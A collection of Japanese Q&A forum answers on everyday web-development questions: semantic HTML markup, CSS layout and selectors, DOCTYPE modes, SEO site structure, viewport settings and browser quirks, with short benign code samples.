IEのバージョンも、どのモードで動作しているかもわかりませんし、HTMLもCSSも書かれていないので、わかりません。 　まず、DOCTYPEスイッチをきちんと指定して、(もちろんHTMLもただしく)、いずれのブラウザも標準モードで動作させてみてください。 ★doctypeスイッチ - Google 検索 ( https://www.google.co.jp/search?q=DOCTYPE%E3%82% … ) 　たぶんそれで解決するはずです。 　IEには多くのバグがありますし、古いブラウザも現役でたくさん動いていますから、ウェブページをウェブ標準で作成し、標準モードで動作させ、ブラウザの差はスタイルシートで調整することになります。
＞フリーエリアの中のhtmlは、 ＞ ＞<div class="plugin-freearea" &align> ＞&freearea ＞</div> 　HTMLは、それじゃないです。(大文字ですよ) 　実際に出力された、HTMLです。firefoxで閲覧し、ツール→Web開発→Don Inspectorがもっともわかりやすいですが、実際に出力されたHTMlの構造です。 　それをつかって先にあげた例のような [例] html　　　　　　　　　　　class名　　　　　id |-- head |-- body |　　|-- div　　　　　　header　　　　　　top 　　　　　|-- p　　　　　logo 　　　　　　　|-- img src="../image/logo.gif"←この画像でしたら で、デザインを指定したい要素を特定してください。
プラグインの中に特定のクラスを指定することが出来るのでしょうか、 もしクラスをCSSで追加できるようでしたら、 CSSで表示を変更したらやりやすいと思います。 <div> <!--category--> <div class="title_font" &align> <!--category_sub_hasnext-->┣<!--/category_sub_hasnext--> <!--category_sub_end-->┗<!--/category_sub_end--> <a href="<%category_link>" title="<%category_name>"><%category_name> </a> </div> <!--/category--> </div> 【CSS】 .title_font { font-size:16px; font-weight:bold; margin-top:20px; } もし、クラスを指定できないようでしたら、 CSSの書き方を工夫して指定したら大丈夫だと思います。 <div> <!--category--> <div &align> <!--category_sub_hasnext-->┣<!--/category_sub_hasnext--> <!--category_sub_end-->┗<!--/category_sub_end--> <a href="<%category_link>" title="<%category_name>"><%category_name> </a> </div> <!--/category--> </div> 【CSS】 div div a { font-size:16px; font-weight:bold; margin-top:20px; } みたいな感じで、、、
すみません。この掲示板のシステムの問題でわかりにくい回答になっていました。 [ここから] 　たとえば http：//hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/ 　以降に好きな文字列を入れてみてください。 http：//hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/hpineh0913/abc 　とか・・・・ もちろん http：//hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/hpineh0913.pdf でも構いません。 　このサイトはENV_FORM.cgiがわかるようになっていますが、これをABCというファイル名に変更して動作させれば、 http：//hpcgi1.nifty.com/Iruka/ABC/hpineh0913.pdf 　となって、ご期待のような？動作になります。あとはCGIで、hpineh0913.pdfの値から、適当な情報を収集してページを作成すれば良いです。 に訂正します。上記URL中の:は：に置換してあります。
ファイルの関連付けの問題のようね フォルダオプションで確認してみてはどうかしら？
SEOですか。 2つの階層があります。リンク階層とフォルダ階層。 1つはどこからかリンクを貼られた場合の、そこから1クリックでいけるページ、2クリックでたどれるページ……とありますが、エンジンロボットがたどれるページを考えた階層。ロボットは延々とリンクがなくなるまで探さずに、1クリック圏内でさよなら、2クリック圏内でさよならとページによって分けます。それ以外は無かったことになりますので、ロボットを誘導できるページを作ると有利です。これは、先に書いた人間が興味ないと直ぐに帰ってしまうのに似ています。あまりに離れたページは見ないことが多いし、ロボットもたどらない。 ロボット向けにはすべてのページからサイトマップにリンクを貼ればサイトマップで1クリック。そこから他のページへで、2クリックという方法や、サイトマップをgoogle指定の方法で、教えてあげるのも有効です。両方1ページには100リンク以内としてください。 フォルダの階層ですが、例えば、http://fruits/apple/***.htm なら、ロボットにも人にも果物でりんごとわかります。このような場合、検索結果にfruitsやappleが加点されますし、パンくずリスト代わりにもなります。fruitsで検索されれば、このURLに含まれるfruitsも対象になります。 その他、リンクを変えないための階層はseoにも有効です。というか、urlを変えると減点になります。変更したページにリンクが貼られていたら折角のリンク加算が0になります。お気に入りに登録してくれた人も迷子、見つかりませんと表示されれば帰ってしまう人が出ます。 人を不満なまま帰さないことは、seoに有効です。googleはいろいろなツールを無料で提供し、そのツールを通じて人々の行動を観察しています。そしてそれを、検索結果に反映しています。最初、seo向きに上手く作り上位表示されても、人に好まれないサイトは、下位に下げてしまう仕組みができています。人を大事にすることはseoにも有効です。 この手の質問では良く思うのですが、seoならどうして自分で調べないのでしょう？「seo 階層」調べました？調べれば出てきますし、そういう利用者をターゲットにするのにその気持ちや利用法を体験できますよ。
懇切丁寧に教えられるほど知識がありませんので、ごく簡単な原理のみのサンプル。 …って、その前にjavascriptでもいいんですよね？ 1～3までです。（かなり適当） （全角空白は半角に） <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html lang="ja"> <head><title>sample</title> <meta http-equiv="Content-Style-Type" content="text/css"> <meta http-equiv="Content-Script-Type" content="text/javascript"> <style type="text/css"> <!-- #image_box { position:relative; } #image_box img { width:800px; height:600px; } #number { position:absolute; font-size:200px; color:#fff; display:none; } ul.select, ul.slect li { list-style-type:none; margin:0; padding:0; } ul.select li { float:left; width:2em; text-align:center; cursor:pointer; } //--> </style> <script type="text/javascript"> <!-- function hoge(evt){ 　var t = evt.target || evt.srcElement; 　if(t.nodeName != "LI") return; 　var text = t.textContent || t.innerText; 　var val = +text * 35; 　if(typeof val != "number") val = 10; 　t = document.getElementById("number"); 　t.innerHTML = text; 　t.style.top = val + "px"; 　t.style.left = (val*2) + "px"; 　t.style.display = "block"; } //--> </script> </head> <body> <div id="image_box"> <img src="img/photo01.jpg" alt="image"> <div id="number">1</div> </div> <ul class="select" onclick="hoge(event)"> <li>1</li><li>2</li><li>3</li> <li>4</li><li>5</li><li>6</li> <li>7</li><li>8</li><li>9</li> </ul> </body> </html> ネットの拾い読みで覚えただけの素人なので、解説は無しです。
ORUKA1951様 詳しい解説ありがとうございます，たいへん勉強になります。
（この書き込みは解決策の提示ではありません） ANo.5～ANo.8の結果から次のことが明らかになったと言えそうです。 質問者がお使いのWindows Vistaでは， 拡張子 .htm と .html に対する「開く」操作はともにInternet Explorerに関連付けられているけれど，その動作が異なるということです。 しかもそれは，IEに限った異常ではなく，エンジンが異なるFirefoxでも同じ症状が出ているため，ANo.6のような関連付けの変更ではおそらく直らないように思われます。 レジストリの内容まで深く調査する必要があるように思いました。 このQ&Aをご覧になっている回答者の方々で，Vista以降のレジストリに詳しい方がいらっしゃいましたら，フォローいただけると幸いです。 -------- > ANo.6のような関連付けの変更ではおそらく直らない と自分で言いつつ，ダメモトで試してみたい気もします。 コントロールパネル →既定のプログラム →既定のプログラムの設定 →Firefox →このプログラムの既定を選択する →.html を選択して［保存］ で，.htmlファイルがFirefoxで開けるようになったらラッキー。 コントロールパネル →既定のプログラム →既定のプログラムの設定 →Internet Explorer →このプログラムの既定を選択する →.html を選択して［保存］ で設定を上書きすれば .htmlがIEでも開けるようになるかもしれません。（でも，ダメな可能性の方が高いかな…）
canvasやvideoを使わなければ、HTML5の必要はないでしょう。 XHTMLの必要はないでしょう。というかXHTMLの開発は中断されXHTML5に統合された形になっています。 　5～6年前までは、確かに世の中XHTMLに向かっていると騒がれてましたが・・それは過去の話 　なお、スマートフォンでも閲覧可能なページを用意しておくのは良いですが、ユーザーエージェントごとにページを色々と作成するのは、本来のHTMLの意味からは間違っています。 　下記をしっかり読んで理解しておくこと 2.2.1 HTMLの略歴 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　
レイヤータグがなにを意味するかわかりませんが、HTMLのタグは、HTML文書全体の中で、それがどのような構成要素であるかを示すため以外のものではありません。たとえば見出しなら<h1>見出し</h1>ですし、ひとつの段落を<p></p>というタグで括ります。決してデザインのためではありません。 　そのうえでスタイルシートで、この要素の上に、この要素を重ねるとかを指定していきます。 　たとえば、画像の説明のリストがあったとします。リストですから <ul class="imageList"> 　<li><img・・・> 　　<ol> 　　　<li class="explanation">説明</li> 　　　<li class="date">撮影日時</li> 　　</ol> 　</li> 　<li><img・・・> 　　<ol> 　　　<li class="explanation">説明</li> 　　　<li class="date">撮影日時</li> 　　</ol> 　</li> とかになっているはずです。 　それをスタイルシートで、 ul.imageList,ul.imageList>li{dsplay:block;list-style:none;margin:0;padding:0;position:relative;} ul.imageList>li>ol{position:absolute;top:20px;left:20px;} という風に、重ねて表現したり、画像の右側に並べたり・・・・スタイルシートで自在に表現します。 　示された質問の動画やテキストがどのような文書構成要素かわからないので、具体的方法は示せませんが、動画とテキストを含む要素全体のposition指定をstatic意外にして、その内部でテキストをposition:absolute;で絶対配置することになるでしょう。
右クリックを禁止するなら <BODY text="#000000" oncontextmenu="return false"> と言うコードが使えるそうです。
HTML的に明らかに間違っているので手のうち用がないです。 もし、 <div id="blog"> <div></div> </div> てしたら、 div#blog{background-image:url();} div#blog div{margin:;scroll:auto;} で済むはず・・ 　ふるいIE用も考慮するなら <div id="blog"> <p><img 極小サイズでよい></p> <div></div> </div> div#blog{width:***;height:***;position:relative;} div#blog p{margin:0;height:100%;width:100%;} div#blog p img{display:block;width:100%;height:100%;position:absolute;top:0;left:0;}/*inline要素であるimgをbloxk要素に */ div#blog div{margin:***;overflow:auto;} とかですむはず。 　divスープ、idスープのHTMLを書いちゃうと後で手を入れるのが大変です。
#4 です。 細かい付け足しですが、「トップページの直下にあるページ」という表現はやや違和感があります。 トップページは単一ファイルですから直下は存在しません。ルートディレクトリ直下なら理解できます。 一般にトップページは http://www.example/ ですが、実際には http://www.example/index.html 等のHTML文書を参照しています。(HTML文書でないケースもありますが、何らかのファイルを参照しています) http://www.example/index.html 直下はありませんので、やはり違和感があります。
まずは、 #image-navigation ul li a img{ border: none;} は不要かな？ a を blockにすると、ありえないbottomが出てくるから、 #image-navigation ul li a img{ vertical-align: bottom;} で良いと思うよ。 block の場合、a に　heightも入れると確実かな。 つまり、 #image-navigation ul li a img{ border: none; vertical-align: bottom;} ハックでもよいけどね。 ---------------------------- imgじゃない場合は、 全liを一行設定にしたり、 IE7用ハックで、{ float:left;}か、zoom:1;　かな
>XHTML及びHTML5で作りなおしたほうが良いのでしょうか。 弊害はありませんがHTML5では宣言は以下のように簡略化できます <!DOCTYPE html>または<!DOCYTPE xhtml> 移行に関してはHTML5で廃止されている要素(<font>など)を使わないようにすれば基本大丈夫です、かといってHTML5専用の要素ばかり使うのは考え物ですが。 >どこから手をつければ良いのか分からず立ち止まっています。 >パソコン向けのものとスマートフォン向けのページを共有させようと考えています。 基本の1つとしてスマートフォンサイト制作にはちょっとだけ注意点があります。それは「ズームさせないこと」です。 スマートフォンでPCサイトを閲覧するとページの横幅が画面の横幅に合わせられてしまい、横に広いページではズームしないと非常に見づらくなります。 これをデフォルトの倍率に固定し、ズームさせないようにするには次の要素をhead要素内に追加します。 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no,"> widthパラメータにdevice-widthを指定することでページの横幅を画面の横幅に固定 initial-scaleに1.0を指定するとデフォルトの倍率に またここではuser-scalableにnoを設定しているためズーム操作が一切できなくなります。 あとは画面の表示内容をスマートフォン向けにレイアウトを簡単にすれば大丈夫です。(基本的にCSSのfloat指定による画面分割はなるべく使わないようにしてください) ちなみに各要素にCSSでwidth:100%を指定すると、その要素の横幅が親要素の横幅に合います たとえばbody要素のすぐ下に配置してあるimg要素に指定すれば、その要素で表示する画像がウィンドウの横幅に合うようになります（※その際、縦横比は保持されます） 参考URL：http://www.htmq.com/html5/index.shtml
確かに美しくないですね（全角スペース、&emsp;、画像スペーサーも） ※ それこそメンテで、間隔を変更したい場合に全ページの編集が必要だし・・・ という事で、デザイン部分はCSSで！ どんなリストかわかりませんが、 それをリストと認識しているなら dt,ddの定義リストやul,liで箇条書きリストでマークアップするべきで、 CSSで間隔を空けてデザインできます。 marginでもpaddingでもtext-indentでも可能ですし、 widthとtext-alignを絡めたり、positionでも配置できます。 上記が理解できなとか難しいとか、マークアップは不要とかなら word-spacing:20em; などで間隔が空きます（該当単語を半角スペース区切りる） <p style="word-spacing:200px;">１文字目 ２文字目 ３文字目</p> 外部CSSなら、 p.sp1{word-spacing:8em;} <p class="sp1">１文字目 ２文字目 ３文字目</p>
＞すみません。英語は無理です。 google翻訳で・・・・firefox + google Transrator for firefox 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 参照画素は、96dpiの画素密度と腕の長さのリーダーからの距離を持つデバイス上の1画素の視覚角度です。 28インチの公称腕の長さについては、視野角は従って約0.0213度である。腕の長さで読み取るために、1pxのは、このように約0.26ミリメートル（1/96インチ）に対応しています。下の画像は、参照画素のサイズに距離を表示するための効果を示しています：71センチ（28インチ）0.26ミリメートルの参照画素の結果の読み取り距離を、で3.5メートル（12フィート）の結果の読み取り距離ながら、 1.3ミリメートルの参照画素。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Syntax and basic data types( http://www.w3.org/TR/CSS2/syndata.html#length-un … )］より 　便利の良い時代になりました。(^^) 　言い換えれば、画像自体が何ピクセルなのかが重要で、ディスプレイ上での１ピクセルがどの大きさかは、上記指定に関わるということです。 　元々、ディスプレイに描画するときに一インチ当たり何ドットで画像を処理するかと言う意味で、これもディスプレイ自体の解像度とは直接関係ありません。足りなきゃ埋めるしあまれば間引く。 　大事なことは印刷を想定されるページでは、高画質で作成しディスプレイ上のサイズはピクセルで縮めておくことくらいですかね。
順番が違います。 　HTMLでは、その文書全体を、それを構成する要素に分解して、その構成要素一つ一つをマークアップしていきます。デザインは一切(というくらい)考えたらダメです。今から始められるのでしたら、この点だけは徹底的に理解してください。HTML5では、とても厳しくなります。 ＞このように書きたいということになります。 　そのためにHTMLを書いてはダメ!!!それはHTMLの仕事じゃない!! 　通常の文書は最低限 <body> 　<div class="header"> 　　<h1>ページの見出し</h1> 　　<p>このサイトは・・・</p> 　</div> 　<div class="section"> 　　<h2>本文記事見出し</h2> 　　<p>記事・・</p> 　</div> 　<div class="footer"> 　　<h2>文書情報</h2> 　</div> </body> のような構造はしているはずです。HTML5だと <body> 　<header> 　　<h1>ページの見出し</h1> 　　<p>このサイトは・・・</p> 　</header> 　<section> 　　<h2>本文記事見出し</h2> 　　<p>記事・・</p> 　</section> 　<footer> 　　<h2>文書情報</h2> 　</footer> </body> となります。 <ul> <div class="menu"><li>項目1</li></div> ・・・【中略】・・・ <div class="menu"><li>SAMPLE</li></div> </ul> はナビゲーションですから、 <div class="nav"> 　　<ul> 　　　　<li>項目1</li> 　　　　<li>項目2</li> 　　　　<li>SAMPLE</li> 　　　　<li>SAMPLE</li> 　　　　<li>SAMPLE</li> 　　</ul> </div> とマークアップして、それを本文中にでも入れておきます。 ※ulの中には<li>以外は存在してはなりません。 ※BRは、通常は使わない要素です。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HTML5だと <nav> 　　<ul> 　　　　<li>項目1</li> 　　　　<li>項目2</li> 　　　　<li>SAMPLE</li> 　　　　<li>SAMPLE</li> 　　　　<li>SAMPLE</li> 　　</ul> </nav> でよいのです。 ★あくまで、HTMLは、文書を構成している要素(エレメント)をマークアップするものです。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ★その文書構造を元にスタイルを指定していきます。たとえば本文中のナビゲーションでしたら div.section div.nav{} という指定方法になります。デザインのためにclass名をつけるのではありません。また、いちいち書かなくても、 div.section div.nav{}で、本文(section)内の<div class="nav">だとわかります。!!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［7.5.4要素のグループ化: DIV要素とSPAN要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ★下記はHTML4.01strictです。今から始めるなら、HTML4.01strictから始めましょう。Transitionalではありません。HTML5はstrictしかありません。 ★書いたら、Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … )でチェックする。 ★スタイルシートはその後 ★HTML5 における HTML4 からの変更点の「新しい要素」 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )を読むとclass名にどんなものが良いかわかります。 ★下のソースでタブは＿に置換してあるので戻すこと。 　文書構造とプレゼンテーションを分けなければならない意味がよくわかると思います。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} p{margin:0 1em;text-indent:1em;line-height:1.4em;} h1,h2,h3{margin:0;line-height:1.4em;text-align:center;} body{background-image:url(./images/background/stone.jpg);} div.header, div.section, div.footer{ ＿width:80%; ＿min-width:480px;max-width:900px; ＿margin:0 auto; ＿border:solid 1px gray; } div.section{min-height:400px;position:relative;} div.section>*{margin-left:200px;} div.nav{ position:absolute; top:0; width:200px; margin-left:0; height:100%; background-color:white; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>ページの見出し</h1> ＿＿<p>このサイトは・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>本文記事見出し</h2> ＿＿<p>記事・・</p> ＿＿<div class="nav"> ＿＿＿<ul> ＿＿＿＿<li>項目1</li> ＿＿＿＿<li>項目2</li> ＿＿＿＿<li>SAMPLE</li> ＿＿＿＿<li>SAMPLE</li> ＿＿＿＿<li>SAMPLE</li> ＿＿＿</ul> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿</div> </body> </html>
皆さんが仰るとおり、JavaScriptが動かない環境の人への配慮を考えると、JavaScriptでどうこうするのはオススメできません。 「IFRAME」をお使いになられてはいかがでしょうか？ http://www4.plala.or.jp/airegin/css/page40.html ただし、IFRAMEが表示されない環境もありますからね。。。
html,body{}ですよ。 htmlにもpaddingがあるはず・・・ どちらにあるかはブラウザによって差があるので、セレクタはグループにして記述すると楽です。 どこにどれだけマージンがあるかは html{background-color:red !important;} body{background-color:blue !important;background-image:none !important;} とすれば、わかります。 他の要素についても body>*{background-color:green !important;background-image:none !important;} body>*>*{background-color:yellow !important;background-image:none !important;} とか・・子供セレクタに全称セレクタを組み合わせて調べる・・。 ★出所や優先度(詳細度)でソートされた後に、詳細度が参照されますから!important宣言は他のどれよりも優先されます。(ユーザーの重要宣言を除く)
こんにちは。 http://postoro.blogspot.com/2011/02/1-ie-javascr … のお話のようですね。 ものによってはあまり効果が無いようですので削除しても問題ないと思います。
『見出しをいれないといけない』のではなく、section 要素からアウトラインを抽出するとき、各セクションに「必ず見出しが割り振られる」のです。もし見出し要素がなければ「見出しが未定義のセクション」として扱われます。 通常、「見出しが未定義のセクション」は不格好なので使いません。ただ、大きな意味段落をセクションのように扱い、小見出しも与えない、というケースは考えられなくはありません。この場合、アウトラインに「見出しが未定義のセクション」が並ぶことに注意して下さい。 とはいえ、ご質問にあるように『見出しになる場所に』『画像のみ』入れるなら、その画像が見出しを意味しているわけですから、h1 要素などを使うことができるはずです。言うまでもなく、img 要素を使うとき alt 属性が基本的に必須ですので、画像を見出しにすることは何ら問題ありません（HTML(5) では alt 属性を省略できますが、それは限られた場合だけです）。 <h6><img src="..." alt="アンパンマン号、発進！"></h6> HTML(5) のセクションの説明なら、「アウトライン」に触れているものを探して下さい。アウトラインなくして HTML(5) のセクションは語れません。 article 要素は、署名と強く結び付いています。記事の文責が誰にあるかを示すのが address 要素です。 言い直すと、address 要素の有効範囲は、最も近い先祖である article 要素になります。「この article を書いたのは address である」となります。もし「最も近い先祖である article 要素」がなければ、address 要素の有効範囲は body 要素となります。 例えば、このような掲示板の場合、まずページ全体の文責が goo にあるとして article が 1 個できます（あるいは body）。各質問、各回答はそれぞれ文責者が異なりますので、それぞれが article になりえます。実用的な観点から言えば、記事をデータベースに格納する際、ひとまとめに扱える範囲のことです。 それだけです。それ以外の性質は section 要素と何ら変わりませんので、article 要素もアウトラインに載ります。
>ちょっと前に人気だったClearってアプリがありますが、あのアプリはネイティブアプリでしょうか？ >それともHTML＋CSS＋JavaScriptで作ったWebアプリでしょうか？ Safariを起動してURL入力でアクセスするならWebアプリです。 Appストアに登録されていたらネイティブです。（開発可能な言語はobjCとJavaScriptの２種類ありますが、そのどちらが使われているかは、開発者でなければわかりません。）
RSSリーダーは、内容を読むわけではありません。あくまでタグを解釈するだけです。 ★エンコード形式をShift_JISに変更 ( http://homepage.mac.com/katsuragawa/blog/C954008 … ) ★Shift-JISのフィードの登録について - はてなRSS ( http://www.google.co.jp/#hl=ja&safe=off&output=s … ) とか・・
ANo.1 です。 全ソースとは言ってないですよ。 不都合な部分と関係ない部分は削除してもらっていいので、その不具合が確認できるソースがあれば検証可能かと思います。
>ビルダーで作ったテーブルのソースをそのまま貼り付けてブログにちゃんと反映されますかね？ いろいろ衝突を起こすので絶対にしないでください 仕方が無いのでtableタグについて触れておきましょう。 tableタグを利用することで、表を作ることができます。 <table>…表の範囲の指定。この中(<table>～</table>)にまず<tr>タグを追加する <tr>…表の「行」の指定。この中にさらに<td>や<th>を追加する <td>…表の「セル」の指定。要は1マスの内容をここに書く。 <th>…同じく「セル」の指定だがこちらは見出し用。入力した内容は初期状態では中央添えの太字になる サンプル（メモ帳に張り付けて.htmlの拡張子で保存して開いてみてください)↓ <!--<table>だけでは枠が表示されないので枠の太さを2ピクセルとしています--> <table border="2"> <tr> <th>名前</th><th>趣味</th> </tr> <tr> <td>太郎</td><td>サッカー</td> </tr> <tr> <td>花子</td><td>バレーボール</td> </tr> </table> これがFC2で使えるのであればこれでOKです。 「タグ」という単語すらわからなければHTMLの本を読んで勉強してください。 また詳細な見栄えの設定はCSSを勉強してみてください。
Google Formをオススメします。 これなら、Gmailのアカウントさえ取れば プログラムの知識が無くてもフォームが作れます。 作ったフォームは、元サイトから飛ばしてもいいし、 iframeでサイト内に組み込んでもいいです。 ただ、フォーム部分は自由にデザインできません。 まぁ単にフォームを作るだけなら非常に簡単です。 参考URL：http://casestudy.master-apps.jp/document/google- …
＞デザインは切り離すのですね。 　そうです。たとえば表(縦横に同じ種類のデータが並ぶ)でないものを、デザインのために使うなどは決して、してはならないのです。 ★表の概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) などに詳しく書いてあります。
emは、exとともに相対サイズです。 Syntax and basic data types ( http://www.w3.org/TR/CSS2/syndata.html#length-un … ) 　基準とする値が決められていない限りは、ブラウザによって差が出ます。 絶対サイズには ・in: inches — 1in is equal to 2.54cm. ・cm: centimeters ・mm: millimeters ・pt: points — the points used by CSS are equal to 1/72nd of 1in. ・pc: picas — 1pc is equal to 12pt. ・px: pixel units — 1px is equal to 0.75pt. がありますので、事前に body{font-size:13px;}とか指定してあれば、差は減らすことができます。 ただし、フォントサイズが問題になるデザインはウェブデザインとしては、とてもまずいことです。ユーザーは場合によったらフォントサイズは変えて閲覧しますし、使用するフォントも様々です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ブラウザひとつとっても、IE,Firefox,Opera,safari,googleChrome,、さらにOSも様々です。当然使用可能なフォントも異なります。ウェブデザインとは、印刷物と異なり様々な媒体で情報が共有できるためのもので、特定のブラウザでの見栄えは二の次、三の次です。 　大きくずれたって構わない・・・それが本当のウェブデザイナーの腕の見せ所。
ブラウザの設定です。 サーバーからデータが送信される場合、そのデータの種類(MIME Type)やサイズなどが事前に応答ヘッダとして送られます。 ★MIME Type 一覧表 ( http://www.plala.or.jp/access/community/phps/mim … ) 　本来ブラウザは、それによってどう処理するかを決定しますが、IEはユーザー側の設定を優先するバグがありました。(ほとんど使用しないので良く知りませんが、最近は改善されたのかも) 　たとえば、application/octet-streamだと、タウンロードするはずですが、以前のIEはアクロバットで開いていました。 　IE以外のブラウザだと、ファイルの種類やMIME Typeによって個別に動作を指定できるものが多いです。
基本的に無料だと共用サーバに限られます、そこだけ注意してください そのうえでこちらはどうでしょう↓ http://www.pf-x.net/
どのような端末で閲覧されても情報が伝わるように作成するのが本来の方法ですが・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　そのページのスタイルシートで端末によってスタイルを変えて、本来見せたいページへのリンクを表示させるのがスマートです。 　また、CGIでユーザーエージェントによって、ページ内容を変えるとか そのHTMLが、hoge.htmlだとすると .htaccessにて、 AddType application/x-httpd-cgi hoge.html; として、 #!/usr/local/bin/perl ***** if($ENV{'HTTP_USER_AGENT'}=~/Mozila|*****************){ open??? とか・・ 　長い目で見たらサーバーの設定を変えずに済ませるほうが楽です。
こんにちは。 <table id="id-table"> </table> と、tableにidを付けて <a href="#id-table">テーブル</a> とリンクを貼ればｔａｂｌｅの位置に遷移すると思います。 ブラウザ間の問題は起きないと思いますが、古いブラウザでは飛ばないです。 古いといっても多分相当古いです。IE5.5ではとりあえず動いています。 ※ページ内に同一のidは付けられないのでご注意ください。
#2でDrFellさんが良い例を示されています。 ＞これをdivにかえてやれるか試してみたいと・・・ 　divは、他に適切なタグがないときに、文書構造を示すために使うもので、デザインのためにdivで括れば良いというものではありません。 　たとえば、作成されている部分が、商品リストやアルバムでしたら、リストでマークアップしたほうが良いでしょう。その上で、ひとつの単位でしたら [例] <div class="section" id="album"> 　<h2>我が家のワンコ<h2> 　<ul> 　　<li>一日の始まり 　　　<ol> 　　　　<li><img src=***** alt="寝起きで犬の癖に寝ぼけている"></li> 　　　　<li>朝、起きたばかりで少し寝ぼけている</li> 　　　　<li>・・・・</li> 　　</li> とか・・・ 　大事なことは、HTMLはデザインためのものじゃなく、あくまで文書がどういう構成要素で成り立っているかをマークアップしていくものだということです。 　スタイルシートは、その文書構造にしたがってデザインをしていくのです。 　この区別さえできていれば、将来まったくデザインを変えるときも、HTMLの制約も受けません。
バイナリデータの場合は、特定のバイトコードのみ欠損するらしいです。 全部のデータが消えるわけではなかったので、普通に取得できるのかと思ってました。 すみません。 なんか、うまくいったっぽいです。 http://home.wi-wi.jp/lab/00t/ でもたぶん、対処療法だと思います。 req.responseType = "blob"; として、req.responseから取得するのが、たぶん今後の標準になると思いますが、 Safari5.1、Opera11、Chrome17、Fx10で取得できませんでした。 https://developer.mozilla.org/en/XMLHttpRequest
No.1です。 お客さんの要望とのことですが、それでしたらとってもまずいと説明してください。誤った実装を説明するのも、請負業者の責任です。後で「何で言ってくれなかったのか」といわれます。かっこよいボタンにでもすればよいかと。 　それはともかく、フォームを使うということは、それで次の選択項目を入れ替えるなどされるのでしたら、いちいちサーバーにアクセスしていたら大変ですので、Prototype JavaScript FrameworkやjQueryのようなAjaxで実装されるほうが良いでしょう。
テキストの改行位置はブラウザ依存です。 日本語の「禁則処理」は世界的に有名ですので、日本人のサポート（開発者）により禁則処理が組み込まれていることがほとんどですが、 マイナーな言語（開発者にその言語ネイティブの話者がいない場合）は、禁則処理が言語の文法に合わないことも多いようです。 （かつては日本語も禁則処理がまったく施されていませんでした。ですので、促音や句読点から始まることもありました。） >自動で改行位置を判別してくれる場合、そのルールが記載されたファイル（タイ語の辞書のようなもの）がローカルのどこかに存在しているのでしょうか？ >また、そのファイルが存在した場合、カスタマイズも可能なのでしょうか？ ブラウザのソースコードに書かれていることもありますし、設定ファイルとして保存されていることもあります。（設定ファイルとして保存されているブラウザは見たことがありませんが。） つまりブラウザ依存です。 <wbr>という禁則処理をHTML制作者が指定するタグがありますが、すべてのブラウザが対応していないようです。 Operaは（私が作った限りでは、私の思い通りの場所で）<wbr>が機能しているようです。 http://en.wikipedia.org/wiki/Zero-width_space Zero-width-spaceというのがあります。 この方法はすべてのブラウザが対応していますが、単語を切ってしまうため、あまりおすすめはしません。 また、もともと「単語」という概念がない言語の場合は機能しないことが多いです。
ソースをは隠されていないので、読めばわかりますが 単純にアニメーションGIFを背景にしているだけです。 セレクタ:hover{background-image:url() 　　　　:動的な擬似クラス{背景} firefox+fireBugで調べると良いです。
